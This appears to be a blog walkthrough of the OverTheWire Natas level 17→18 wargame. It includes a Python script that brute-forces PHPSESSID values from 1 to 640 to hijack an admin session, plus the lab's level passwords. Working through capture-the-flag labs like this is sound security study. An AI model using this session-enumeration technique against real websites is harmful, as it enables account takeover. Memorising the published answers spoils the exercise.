---
layout: post-with-comments
title: "OverTheWire Natas Level 17 → 18 tutorial!!"
permalink: /posts/overTheWire-Natas-Level-17-to-18/
tags: [overthewire, natas, walkthrough, ctf, web, beginner, session, bruteforce]
description: "A step by step tutorial for OverTheWire Natas Level 17 → 18!!"
---

<!-- Scoped styles: only affect this post -->
<style>
  .bandit-nav{display:flex;align-items:center;gap:.75rem;margin:.5rem 0 1.25rem;border-top:1px solid var(--border-color,#3a3a3a);padding-top:.75rem}
  .bandit-nav .nav-left,.bandit-nav .nav-center,.bandit-nav .nav-right{flex:1}
  .bandit-nav .nav-left{text-align:left}
  .bandit-nav .nav-center{text-align:center}
  .bandit-nav .nav-right{text-align:right}
  .bandit-nav a{display:inline-block;padding:.45rem .8rem;border:1px solid var(--border-color,#3a3a3a);border-radius:.6rem;text-decoration:none;line-height:1}
  .bandit-nav a:hover{transform:translateY(-1px)}
  .bandit-nav .disabled{opacity:.55}
  :root[data-theme='light'] .bandit-nav a{border-color:rgba(0,0,0,.15)}
  code{white-space:pre-wrap}
</style>

<nav class="bandit-nav" aria-label="Natas level navigation">
  <div class="nav-left">
    <a href="{{ '/posts/overTheWire-Natas-Level-16-to-17/' | relative_url }}">← Previous: Level 16 → 17</a>
  </div>

  <div class="nav-center">
    <a href="https://overthewire.org/wargames/natas/natas18.html" target="_blank" rel="noopener">
      Official (Level 18) ↗
    </a>
  </div>

  <div class="nav-right">
    <a href="{{ '/posts/overTheWire-Natas-Level-18-to-19/' | relative_url }}">
      Next: Level 18 → 19 →
    </a>
  </div>
</nav>

## Login

URL: <http://natas18.natas.labs.overthewire.org>  
Credentials: **natas18:6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ**

```bash
# Using curl (optional):
curl -u natas18:6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ 
  http://natas18.natas.labs.overthewire.org/
````

![homepage]({{ '/assets/images/natas/level-17-to-18/homepage.jpg' | relative_url }})

---

## Task

The code shows that `admin` login is disabled, but sessions are handled with **PHPSESSID**.
IDs are assigned randomly between **1 and 640**.

That means: if we brute-force the session ID, we might stumble upon an **admin session**.

---

## A little bit of Theory

From the code:

```php
$maxid = 640;

function createID($user) {
  global $maxid;
  return rand(1, $maxid);
}

if ($_SESSION["admin"] == 1) {
  print "You are an admin...";
}
```

So all we need is:

1. Enumerate PHPSESSID values from `1` to `640`.
2. Check which one corresponds to an admin session.

---

## Solution

### Step 1: Python brute force

```python
import requests

URL = "http://natas18.natas.labs.overthewire.org/index.php"
s = requests.Session()
s.auth = ('natas18', '6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ')

for sid in range(1, 641):
    r = s.get(URL, cookies={"PHPSESSID": str(sid)})
    if "Login as an admin" not in r.text:
        print(f"[+] Admin session found! PHPSESSID={sid}\n")
        print(r.text)
        break
```

* It tries all session IDs from 1 to 640.
* For each attempt, it injects `PHPSESSID` as a cookie.
* If the response does **not** contain "Login as an admin", it means we are in an **admin session**.

---

## Output

```
[+] Admin session found! PHPSESSID=119

You are an admin. The credentials for the next level are:
Username: natas19
Password: tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr
```

![output]({{ '/assets/images/natas/level-17-to-18/output.jpg' | relative_url }})

---

## Password

```
tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr
```

---

## Troubleshooting

* **Always regular user?** → Make sure you loop from `1` to `640` inclusively.
* **Script stops too early?** → Check your condition; you want to break only if `"Login as an admin"` is **not** in the page.
* **Still not admin?** → Some sessions might expire quickly; just re-run the script.
* **Too slow?** → Optimize by running requests asynchronously or narrowing the range if you already spotted a pattern.

---

**Nice 🎉** That’s how you brute-forced PHP sessions to hijack an admin account.
On to **natas19** 🚀

---

## Thanks for reading!

Until next time — **Otsumachi!!** 💖☄️✨

![Cinema]({{ '/assets/images/advice/cinema.gif' | relative_url }})

